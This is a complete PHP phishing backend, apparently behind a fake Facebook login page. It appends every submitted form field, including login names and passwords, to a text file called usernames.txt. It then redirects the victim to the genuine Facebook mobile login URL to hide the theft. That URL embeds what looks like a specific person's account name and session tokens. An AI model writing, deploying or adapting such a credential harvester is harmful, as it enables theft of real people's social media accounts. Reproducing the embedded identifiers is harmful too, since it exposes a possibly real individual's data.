<?php
header ('Location:https://d.facebook.com/login/?cuid=AYg-ZkqnRPndM6WxhDZPIkCUdMZo_jBMeM8jTtxPIHpLCPu9yBPnagfOkpuQKWxWCktb87Sih1ci5vnVYAtzLUuCTmena8NPwKBjuXGFLcn25RjaJ8lG21iyfHzWZBSsl6wjzOeFgyKjwJ4jfgwS-f1m7nUe2IdrFZYsJdValwSj898bykT8WMqrRRhPUoNZ3ie9vcvpdrNY2Mz-A1Xc3zZlIAlIOGdfcCiL6SHdlj5-nw&email=pankajmehla.haryana&li=vitAX8cXyRXTCv7aPKlux7x2&lhsrc=lau_sub&e=1348092&ref=dbl&refsrc=https%3A%2F%2Fd.facebook.com%2F&_rdr');
$handle = fopen("usernames.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "<br>");
}
fwrite($handle, "<hr>");
fclose($handle);
exit;
?>